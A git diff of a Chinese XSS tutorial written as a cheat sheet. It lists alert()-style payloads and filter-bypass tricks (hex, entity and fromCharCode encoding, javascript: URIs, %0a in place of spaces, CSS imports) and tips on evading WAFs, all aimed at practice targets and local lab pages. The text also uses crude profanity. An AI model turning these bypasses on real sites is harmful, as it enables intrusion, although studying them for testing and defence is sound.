@@ -1,7 +1,9 @@
-# XSS之王xidaner
-> 详细代码请转常用代码篇，有很多代码分析和实例，此片仅供思路。
+# XSS
+> 详细代码请转常用代码篇，有很多代码分析和实例，此篇仅供思路。
 靶场：
 http://demo.testfire.net/search.jsp?query=1
+
+
 
 ## **直接x他，x他🐎的！**
 
@@ -36,7 +38,7 @@ http://demo.testfire.net/search.jsp?query=1
 [PAYLOAD]填充JavaScript代码alert(1) top.alert(1)...
 
 大体可以理解为：
-```h
+```html
 <[TAG]    [ATTR]=  sth    [EVENT]   =   [PAYLOAD] />
  标签头    属性     事件   事件属性        代码
 ```
@@ -65,6 +67,7 @@ http://demo.testfire.net/search.jsp?query=1
 ## **如何绕过**
 
 ### **16进制编码绕过**
+
 将XSS语句经过16进制编码转换来绕过XSS的规则。
 
 列:
@@ -87,7 +90,12 @@ http://demo.testfire.net/search.jsp?query=1
 <script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)</script>
 ```
 
+
+
+
+
 ## **利用html标签属性值执行XSS**
+
 很多HTML标记中的属性都支持JavaScript脚本，所以我反手给你个xss你怎么说？上号：
 ```
 <img src = "javascript:alert(‘xss‘);">
@@ -99,6 +107,7 @@ http://demo.testfire.net/search.jsp?query=1
 
 
 ## **使用空格，TAB，回车，js编码绕过**
+
 如果过滤时对`JavaScript`进行了过滤，得益于JS代码的**优秀体制**(**该用谁心理有B数了8**)只需要对js做小小的操作即可绕过：
 ```
 <img src= "java　　script:alert(‘xss‘);" width=100>
@@ -117,6 +126,7 @@ http://demo.testfire.net/search.jsp?query=1
 ```
 
 ## **利用CSS跨站解析**
+
 大概就是去在文章引入的CSS中加入一串XSS代码，应为CSS不用嵌入到html中，可以直接从文件或其他地方进行引用。
 `但是 浏览器之间不能通用`
 ```
@@ -129,11 +139,21 @@ http://demo.testfire.net/search.jsp?query=1
 <style>@import ‘javascript:alert(‘xss‘);‘</style>
 ```
 
+
+
+
+
 ## **利用字符编码**
+
 利用16进制转换，或者ASCII表转换来进行xss
 ```
 <script>eval("\61\6c\65......");<script>
 ```
+
+
+
+
+
 
 ## **尝试在请求包中输入值查看是否被带入数值**
 
@@ -149,13 +169,26 @@ user=" type="text" onclick="alert(1)"
 ```
 
 ## **构造payload(采用%0a绕过空格过滤)**
+
 如果过滤了`script、/、与空格`
 在url中直接加入`%0a`绕过空格过滤，解析出来不一样吗，火狐他不香吗？
 ```
 http://127.0.0.1/xss/level16.php?keyword=<img%0asrc=1%0aonerror=alert(1)>
 ```
 
+
+
+
+
+
+
+
+
+
+
+
 ## **如果过滤了双引号和尖括号**
+
 html`实体编码`来过滤尖括号和双引号也是属于编码绕过的一种，测试只有火狐可以实现(A君：谷歌你🐎死了)
 ```
 http://IP/xss/level17.php?arg01=a&arg02=b onmouseover=alert(1)
@@ -164,13 +197,35 @@ http://IP/xss/level17.php?arg01=a&arg02=b onmouseover=alert(1)
 
 当在url输入被过滤等因素后，可以尝试在输入框中加入`js代码`并使用js实体绕过:
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 **js实体编码**
 
 javascrip&#x74;:alert(1) 十六进制
 javascrip&#116;:alert(1) 十进制
 
 
+
+
+
+
+
+
+
 ## [**绕WAF**](https://xz.aliyun.com/t/6652)
+
 当你兴致*勃勃* 输入了第一串代码`<b>`,欸？我日你妈 D盾，创宇盾拦截，百度云盾拦截。小逼崽子**D盾**三天之内祝你**心想事成！** 
 
 > D盾还好，只是拦截，你还可以FUZZ,创宇盾直接给你ip封了，md我搞你还要准备几十个ip？
